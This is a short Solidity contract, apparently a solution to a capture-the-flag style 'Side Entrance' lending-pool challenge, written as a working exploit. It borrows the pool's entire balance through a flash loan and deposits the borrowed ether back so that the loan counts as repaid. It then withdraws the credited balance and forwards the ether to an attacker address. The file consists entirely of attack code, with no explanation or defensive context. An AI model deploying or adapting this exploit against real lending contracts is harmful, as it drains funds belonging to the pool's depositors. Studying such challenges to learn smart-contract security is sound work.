/// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SideEntranceExploit {
    SideEntrancePool sideEntrancePool;
    address payable attacker_address;

    constructor(address pool, address payable attacker) {
        sideEntrancePool = SideEntrancePool(pool);
        attacker_address = attacker;
    }

    function attack() external {
        uint256 poolBalance = address(sideEntrancePool).balance;
        sideEntrancePool.flashLoan(poolBalance);
    }

    function execute() external payable {
        sideEntrancePool.deposit{value: msg.value}();
    }

    function withdraw() external {
        sideEntrancePool.withdraw();
    }

    receive() external payable {
        attacker_address.transfer(msg.value);
    }
}

interface SideEntrancePool {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}
